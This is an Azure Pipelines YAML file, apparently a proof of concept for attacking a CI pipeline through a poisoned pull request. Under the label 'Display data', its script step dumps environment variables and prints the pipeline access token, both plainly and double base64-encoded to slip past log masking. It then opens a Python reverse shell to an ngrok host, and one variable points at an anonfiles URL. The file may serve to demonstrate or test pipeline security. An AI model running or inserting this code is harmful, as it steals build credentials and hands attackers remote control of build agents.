pr:
- main

pool: Default

variables:
- name: varificationUrl # This variable is just an example of a trusted variable that can be compromised
  value: https://cdn-114.anonfiles.com/z2u7T06fy2/d910a710-1662484505

steps:
  - script: |
      printenv
      echo "========================="
      echo $(System.AccessToken)
      echo "+++++++++++++++++++++++++"
      echo $(System.AccessToken) | base64 | base64
      echo "-------------------------"
      echo "Url to verify: $(varificationUrl)"
      echo "verifying the following branch:"
      echo "$(Build.SourceBranchName)"
      echo "verifying the following commit:"
      echo "$(Build.SourceVersionMessage)"
      python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("2.tcp.eu.ngrok.io",16713));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


      
    displayName: Display data

  
